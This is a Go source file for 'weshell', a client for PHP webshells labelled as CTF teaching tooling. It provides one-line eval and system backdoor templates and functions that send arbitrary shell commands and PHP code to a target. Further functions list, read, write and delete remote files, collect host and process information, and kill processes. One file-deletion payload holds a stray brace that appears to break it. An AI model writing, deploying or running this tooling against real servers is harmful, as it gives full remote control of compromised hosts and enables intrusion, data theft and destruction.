// Package shell 实现 weshell 与靶机之间的明文 HTTP 通信与回显提取。
//
// 该包刻意保持「朴素」：请求就是一个带单个参数的表单或查询串，载荷是可读的
// 系统命令或一小段 PHP 代码。没有加密、没有编码变形、没有混淆，
// 因此在教学中可以直接抓包观察真实流量。
package shell

import (
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// maxResponseSize 限制单次响应体积，避免靶机返回一个巨大输出把我们拖垮。
const maxResponseSize = 1 << 20 // 1 MiB

// maxRedirects 限制重定向次数。
const maxRedirects = 5

// 支持的连接类型。
const (
	// TypeEval 对应靶机侧 <?php @eval($_REQUEST['x']);?>，提交的是一小段 PHP 代码。
	TypeEval = "php-eval"
	// TypeCmd 对应靶机侧 <?php system($_REQUEST['x']);?> 等形态，直接提交系统命令。
	TypeCmd = "php-cmd"
)

// TypeInfo 描述一种连接类型，供前端下拉框与教学说明使用。
type TypeInfo struct {
	ID      string `json:"id"`
	Label   string `json:"label"`
	Snippet string `json:"snippet"` // 靶机侧样本模板，{param} 由前端替换
	Note    string `json:"note"`
}

// Types 返回全部支持的连接类型。
func Types() []TypeInfo {
	return []TypeInfo{
		{
			ID:      TypeEval,
			Label:   "PHP eval 型",
			Snippet: "<?php @eval($_REQUEST['{param}']);?>",
			Note:    "最常见的一句话。管理端提交一小段 PHP 代码，用随机标记包裹输出，回显定位最准确。",
		},
		{
			ID:      TypeCmd,
			Label:   "PHP 命令执行型",
			Snippet: "<?php system($_REQUEST['{param}']);?>",
			Note:    "直接把系统命令作为参数值提交。无法插入输出标记，回显为响应体原文。",
		},
	}
}

// Valid 判断连接类型是否受支持。
func Valid(t string) bool {
	switch t {
	case TypeEval, TypeCmd:
		return true
	default:
		return false
	}
}

// ExecOptions 描述一次命令执行所需的全部参数。
type ExecOptions struct {
	TargetURL  string
	Param      string
	Method     string // GET / POST
	Type       string // TypeEval / TypeCmd
	Command    string
	Timeout    time.Duration
	SkipVerify bool // 是否忽略靶机 HTTPS 证书校验
}

// Result 是一次命令执行的完整结果。RequestURL 与 Payload 供教学时观察实际请求形态。
type Result struct {
	OK         bool   `json:"ok"`
	Output     string `json:"output"`
	Status     int    `json:"status"`
	LatencyMS  int64  `json:"latencyMs"`
	Error      string `json:"error,omitempty"`
	RequestURL string `json:"requestUrl"`
	Payload    string `json:"payload"`
	Truncated  bool   `json:"truncated"`
}

// Execute 向靶标发送一次命令并返回回显。
// 所有失败都以 Result.OK=false + Error 体现，不返回 error，便于前端统一渲染。
func Execute(ctx context.Context, o ExecOptions) Result {
	if err := o.validate(); err != nil {
		return Result{Error: err.Error()}
	}
	if strings.TrimSpace(o.Command) == "" {
		return Result{Error: "命令不能为空"}
	}
	start, end, payload := buildPayload(o)
	return send(ctx, o, payload, start, end)
}

// ExecutePHP 提交一段 PHP 代码到靶机执行（仅 php-eval 类型）。
// 代码输出被随机标记包裹，便于从响应中精确截取，适用于文件管理等需要结构化返回的场景。
func ExecutePHP(ctx context.Context, o ExecOptions, phpCode string) Result {
	if err := o.validate(); err != nil {
		return Result{Error: err.Error()}
	}
	if o.Type != TypeEval {
		return Result{Error: "文件管理仅支持 php-eval 类型靶机"}
	}
	start, end := marker(), marker()
	payload := fmt.Sprintf("error_reporting(0);ob_start();%s;echo %s.ob_get_clean().%s;",
		phpCode, phpQuote(start), phpQuote(end))
	return send(ctx, o, payload, start, end)
}

// send 是 Execute / ExecutePHP 共用的底层发送逻辑：构造请求、发给靶机、截取标记之间的回显。
func send(ctx context.Context, o ExecOptions, payload, start, end string) Result {
	method := strings.ToUpper(o.Method)
	u, err := url.Parse(o.TargetURL)
	if err != nil {
		return Result{Error: fmt.Sprintf("URL 解析失败: %v", err)}
	}
	form := url.Values{}
	form.Set(o.Param, payload)

	var body io.Reader
	displayURL := o.TargetURL
	switch method {
	case http.MethodGet:
		// 保留靶标 URL 上原有的查询串，再追加我们的参数。
		q := u.Query()
		for k, vs := range form {
			q[k] = vs
		}
		u.RawQuery = q.Encode()
		displayURL = u.String()
	default:
		body = strings.NewReader(form.Encode())
	}

	if o.Timeout > 0 {
		var cancel context.CancelFunc
		ctx, cancel = context.WithTimeout(ctx, o.Timeout)
		defer cancel()
	}

	req, err := http.NewRequestWithContext(ctx, method, u.String(), body)
	if err != nil {
		return Result{Error: fmt.Sprintf("构造请求失败: %v", err)}
	}
	if method == http.MethodPost {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	req.Header.Set("User-Agent", "weshell/ctf-teaching")

	client := &http.Client{
		Timeout: o.Timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= maxRedirects {
				return fmt.Errorf("重定向次数超过 %d 次，已中止", maxRedirects)
			}
			return nil
		},
	}
	if o.SkipVerify {
		client.Transport = &http.Transport{
			Proxy:           http.ProxyFromEnvironment,
			TLSClientConfig: insecureTLSConfig(),
		}
	}

	begin := time.Now()
	resp, err := client.Do(req)
	if err != nil {
		return Result{
			Error:      fmt.Sprintf("请求失败: %v", err),
			LatencyMS:  time.Since(begin).Milliseconds(),
			RequestURL: displayURL,
			Payload:    payload,
		}
	}
	defer resp.Body.Close()

	raw, err := io.ReadAll(io.LimitReader(resp.Body, maxResponseSize))
	latency := time.Since(begin).Milliseconds()
	if err != nil {
		return Result{
			Error:      fmt.Sprintf("读取响应失败: %v", err),
			Status:     resp.StatusCode,
			LatencyMS:  latency,
			RequestURL: displayURL,
			Payload:    payload,
		}
	}

	out := string(raw)
	truncated := len(raw) >= maxResponseSize
	if start != "" && end != "" {
		if extracted, ok := extract(out, start, end); ok {
			out = extracted
		}
	}

	res := Result{
		OK:         true,
		Output:     strings.Trim(out, "\r\n"),
		Status:     resp.StatusCode,
		LatencyMS:  latency,
		RequestURL: displayURL,
		Payload:    payload,
		Truncated:  truncated,
	}
	if resp.StatusCode >= 400 {
		res.OK = false
		res.Error = fmt.Sprintf("靶机返回 HTTP %d", resp.StatusCode)
	}
	return res
}

// validate 校验一次执行请求的必要字段。
func (o ExecOptions) validate() error {
	if strings.TrimSpace(o.TargetURL) == "" {
		return fmt.Errorf("靶标 URL 不能为空")
	}
	u, err := url.Parse(o.TargetURL)
	if err != nil {
		return fmt.Errorf("靶标 URL 无法解析: %w", err)
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return fmt.Errorf("靶标 URL 必须是 http 或 https，当前为 %q", u.Scheme)
	}
	if u.Host == "" {
		return fmt.Errorf("靶标 URL 缺少主机名")
	}
	if strings.TrimSpace(o.Param) == "" {
		return fmt.Errorf("连接参数名不能为空")
	}
	if !Valid(o.Type) {
		return fmt.Errorf("不支持的连接类型: %q", o.Type)
	}
	switch strings.ToUpper(o.Method) {
	case http.MethodGet, http.MethodPost:
	default:
		return fmt.Errorf("不支持的 HTTP 方法: %q，仅支持 GET / POST", o.Method)
	}
	return nil
}

// buildPayload 按连接类型构造提交给靶机的参数值。
// eval 型会额外返回一对随机标记，用于从层中精确截取回显。
func buildPayload(o ExecOptions) (start, end, payload string) {
	cmd := strings.TrimSpace(o.Command)
	switch o.Type {
	case TypeEval:
		start, end = marker(), marker()
		payload = fmt.Sprintf("echo %s;passthru(%s);echo %s;",
			phpQuote(start), phpQuote(withStderr(cmd)), phpQuote(end))
		return start, end, payload
	default:
		return "", "", cmd
	}
}

// withStderr 给命令追加 2>&1，让标准错误也进入回显，方便教学排错。
func withStderr(cmd string) string {
	if strings.Contains(cmd, "2>") {
		return cmd
	}
	return cmd + " 2>&1"
}

// phpQuote 生成 PHP 单引号字符串字面量。PHP 单引号串内只有 \ 和 ' 需要转义。
func phpQuote(s string) string {
	s = strings.ReplaceAll(s, `\`, `\\`)
	s = strings.ReplaceAll(s, `'`, `\'`)
	return "'" + s + "'"
}

// extract 截取 start 与 end 两个标记之间的内容。
func extract(body, start, end string) (string, bool) {
	i := strings.Index(body, start)
	if i < 0 {
		return "", false
	}
	rest := body[i+len(start):]
	j := strings.Index(rest, end)
	if j < 0 {
		// 命令可能执行到一半被超时掐断，返回已拿到的部分比什么都不给更有用。
		return rest, true
	}
	return rest[:j], true
}

// insecureTLSConfig 仅供用户显式传入 -insecure 时使用。
func insecureTLSConfig() *tls.Config {
	return &tls.Config{InsecureSkipVerify: true}
}

// marker 生成一次性的随机标记，避免与命令输出内容撞车。
func marker() string {
	var buf [8]byte
	if _, err := rand.Read(buf[:]); err != nil {
		return fmt.Sprintf("ws-%d", time.Now().UnixNano())
	}
	return "ws-" + hex.EncodeToString(buf[:])
}

// ---------- 文件管理（仅 php-eval 类型） ----------

// FSListEntry 描述靶机目录中的一项。
type FSListEntry struct {
	Name  string `json:"name"`
	Path  string `json:"path"`
	IsDir bool   `json:"isDir"`
	Size  int64  `json:"size"`
	Mode  string `json:"mode"`
}

// FsFile 是一次文件读取的结果，内容以 base64 返回，避免二进制/特殊字符破坏标记截取。
type FsFile struct {
	Name   string `json:"name"`
	Size   int64  `json:"size"`
	Base64 string `json:"base64"`
}

// fsExec 提交一段 PHP 代码并解析靶机返回的 JSON（需含 ok 字段，false 时取 error）。
func fsExec(ctx context.Context, o ExecOptions, phpCode string) (map[string]any, error) {
	res := ExecutePHP(ctx, o, phpCode)
	if !res.OK {
		if res.Error != "" {
			return nil, fmt.Errorf("%s", res.Error)
		}
		return nil, fmt.Errorf("靶机返回非成功状态（HTTP %d）", res.Status)
	}
	var out map[string]any
	if err := json.Unmarshal([]byte(res.Output), &out); err != nil {
		msg := res.Output
		if msg == "" {
			msg = "(空响应)"
		}
		return nil, fmt.Errorf("靶机返回无法解析为 JSON: %s", msg)
	}
	if ok, _ := out["ok"].(bool); !ok {
		if e, _ := out["error"].(string); e != "" {
			return nil, fmt.Errorf("%s", e)
		}
		return nil, fmt.Errorf("靶机文件操作失败")
	}
	return out, nil
}

func asStr(v any) string { s, _ := v.(string); return s }
func asBool(v any) bool  { b, _ := v.(bool); return b }
func asInt(v any) int64  { f, _ := v.(float64); return int64(f) }

// FsList 列出目录内容。
func FsList(ctx context.Context, o ExecOptions, dir string) (entries []FSListEntry, resolved string, err error) {
	php := fmt.Sprintf(`$dir=%s;$dir=rtrim($dir,'/');if($dir===''){$dir='/';}$abs=is_dir($dir)?(@realpath($dir)?:$dir):$dir;$out=array('ok'=>true,'dir'=>$abs,'entries'=>array());if(!is_dir($abs)){$out['ok']=false;$out['error']='不是目录: '.$dir;}else{foreach(scandir($abs) as $n){if($n==='.'||$n==='..')continue;$p=$abs.'/'.$n;$out['entries'][]=array('name'=>$n,'path'=>$p,'isDir'=>is_dir($p),'size'=>is_file($p)?filesize($p):0,'mode'=>substr(sprintf('%%o',fileperms($p)),-4));}}echo json_encode($out);`, phpQuote(dir))
	m, err := fsExec(ctx, o, php)
	if err != nil {
		return nil, "", err
	}
	resolved = asStr(m["dir"])
	raw, _ := m["entries"].([]any)
	entries = make([]FSListEntry, 0, len(raw))
	for _, it := range raw {
		e, _ := it.(map[string]any)
		entries = append(entries, FSListEntry{
			Name:  asStr(e["name"]),
			Path:  asStr(e["path"]),
			IsDir: asBool(e["isDir"]),
			Size:  asInt(e["size"]),
			Mode:  asStr(e["mode"]),
		})
	}
	return entries, resolved, nil
}

// FsRead 读取文件内容，以 base64 返回。
func FsRead(ctx context.Context, o ExecOptions, path string) (FsFile, error) {
	php := fmt.Sprintf(`$path=%s;if(!is_file($path)){echo json_encode(array('ok'=>false,'error'=>'不是文件: '.$path));}else{echo json_encode(array('ok'=>true,'name'=>basename($path),'size'=>filesize($path),'base64'=>base64_encode(file_get_contents($path))));}`, phpQuote(path))
	m, err := fsExec(ctx, o, php)
	if err != nil {
		return FsFile{}, err
	}
	return FsFile{Name: asStr(m["name"]), Size: asInt(m["size"]), Base64: asStr(m["base64"])}, nil
}

// FsWrite 写入文件内容（b64 为 base64 编码后的数据）。
func FsWrite(ctx context.Context, o ExecOptions, path, b64 string) error {
	php := fmt.Sprintf(`$path=%s;$data=base64_decode(%s);$b=@file_put_contents($path,$data);echo json_encode($b===false?array('ok'=>false,'error'=>'写入失败'):array('ok'=>true,'bytes'=>$b));`, phpQuote(path), phpQuote(b64))
	_, err := fsExec(ctx, o, php)
	return err
}

// FsDelete 删除文件或（空）目录。
func FsDelete(ctx context.Context, o ExecOptions, path string) error {
	php := fmt.Sprintf(`$path=%s;$ok=is_dir($path)?@rmdir($path):@unlink($path);echo json_encode($ok?array('ok'=>true):array('ok'=>false,'error'=>'删除失败'));}`, phpQuote(path))
	_, err := fsExec(ctx, o, php)
	return err
}

// monitorPHP 采集靶机（仅 Linux）的系统资源概览，以 JSON 返回。
// 纯读取 /proc 与 ps，不写入、不执行危险操作；字段缺失时给空值而非报错。
const monitorPHP = `$mem=array();$s=@file_get_contents('/proc/meminfo');if($s){foreach(explode("\n",$s) as $l){if(preg_match('/^(\w+):\s+(\d+)\s*kB/',$l,$x)){$mem[$x[1]]=intval($x[2])*1024;}}}$cores=0;$model='';$c=@file_get_contents('/proc/cpuinfo');if($c){foreach(explode("\n",$c) as $l){if(stripos($l,'processor')===0)$cores++;if($model===''&&stripos($l,'model name')===0){$a=explode(':',$l,2);$model=trim($a[1]);}}}$usage=null;$st=@file_get_contents('/proc/stat');if($st){foreach(explode("\n",$st) as $l){if(strpos($l,'cpu ')===0){$f=preg_split('/\s+/',trim($l));array_shift($f);$sum=0;$idle=0;foreach($f as $i=>$v){$sum+=intval($v);if($i==3||$i==4)$idle+=intval($v);}$usage=$sum>0?(1-$idle/$sum):0;break;}}}$la=array();$u=@file_get_contents('/proc/loadavg');if($u){$p=preg_split('/\s+/',trim($u));$la=array(@$p[0],@$p[1],@$p[2]);}$ds=array();$raw2=@shell_exec('df -P -k 2>&1');if($raw2){$ls2=explode("\n",$raw2);array_shift($ls2);foreach($ls2 as $ln){$ln=trim($ln);if($ln==='')continue;if(preg_match('/^(\S+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)%\s+(.+)$/',$ln,$m)){$ds[]=array('fs'=>$m[1],'total'=>intval($m[2])*1024,'used'=>intval($m[3])*1024,'avail'=>intval($m[4])*1024,'use'=>intval($m[5]),'mount'=>trim($m[6]));}}}$ps=array();$raw=@shell_exec('ps -eo pid,user,pcpu,pmem,comm 2>&1');if($raw){$ls=explode("\n",trim($raw));array_shift($ls);foreach($ls as $ln){$ln=trim($ln);if($ln==='')continue;$f=preg_split('/\s+/',$ln);if(count($f)>=5){$ps[]=array('pid'=>$f[0],'user'=>$f[1],'cpu'=>floatval($f[2]),'mem'=>floatval($f[3]),'cmd'=>$f[4]);}}}$out=array('ok'=>true,'hostname'=>@gethostname(),'os'=>@php_uname(),'uptime'=>@file_get_contents('/proc/uptime'),'loadavg'=>$la,'mem'=>$mem,'cpu'=>array('cores'=>$cores,'model'=>$model,'usage'=>$usage),'disks'=>$ds,'procs'=>$ps);echo json_encode($out);`

// Monitor 读取靶机的 CPU / 内存 / 负载 / 进程等资源概览（仅 php-eval 类型）。
func Monitor(ctx context.Context, o ExecOptions) (map[string]any, error) {
	return fsExec(ctx, o, monitorPHP)
}

// procPHP 采集靶机进程列表（含父进程 PID 与完整命令行），用于进程树展示。
// 纯读取 ps 输出，不写入、不执行危险操作；ps 不可用时给空列表而非报错。
const procPHP = `$ps=array();$raw=@shell_exec('ps -eo pid,ppid,user,pcpu,pmem,args 2>&1');if($raw){$ls=explode("\n",rtrim($raw));array_shift($ls);foreach($ls as $ln){$ln=rtrim($ln);if($ln==='')continue;if(preg_match('/^\s*(\d+)\s+(\d+)\s+(\S+)\s+([\d.]+)\s+([\d.]+)\s+(.*)$/',$ln,$m)){$ps[]=array('pid'=>$m[1],'ppid'=>$m[2],'user'=>$m[3],'cpu'=>floatval($m[4]),'mem'=>floatval($m[5]),'cmd'=>$m[6]);}}}echo json_encode(array('ok'=>true,'procs'=>$ps));`

// ProcList 读取靶机进程列表（含 PPID），仅 php-eval 类型靶机支持。
func ProcList(ctx context.Context, o ExecOptions) (map[string]any, error) {
	return fsExec(ctx, o, procPHP)
}

// procKillPHP 向靶机指定 PID 发送信号以结束进程。优先 posix_kill，回退到 kill 命令。
const procKillPHP = `$pid=intval(%s);$sig=intval(%s);if($pid<=0){echo json_encode(array('ok'=>false,'error'=>'无效 PID'));return;}$ok=false;$err='';if(function_exists('posix_kill')){$ok=@posix_kill($pid,$sig);if(!$ok)$err='posix_kill 失败（可能无权限）';}elseif(function_exists('shell_exec')){$out=@shell_exec('kill -'.$sig.' '.$pid.' 2>&1');$ok=($out===null||trim($out)==='');if(!$ok)$err=trim($out)!==''?trim($out):'kill 执行失败';}else{$err='环境不支持 posix_kill 或 shell_exec';}echo json_encode(array('ok'=>$ok,'error'=>$err));`

// ProcKill 结束靶机进程（pid 为进程号，sig 为信号，默认 15/SIGTERM，9 为 SIGKILL）。
func ProcKill(ctx context.Context, o ExecOptions, pid string, sig int) (map[string]any, error) {
	php := fmt.Sprintf(procKillPHP, phpQuote(pid), phpQuote(fmt.Sprintf("%d", sig)))
	return fsExec(ctx, o, php)
}
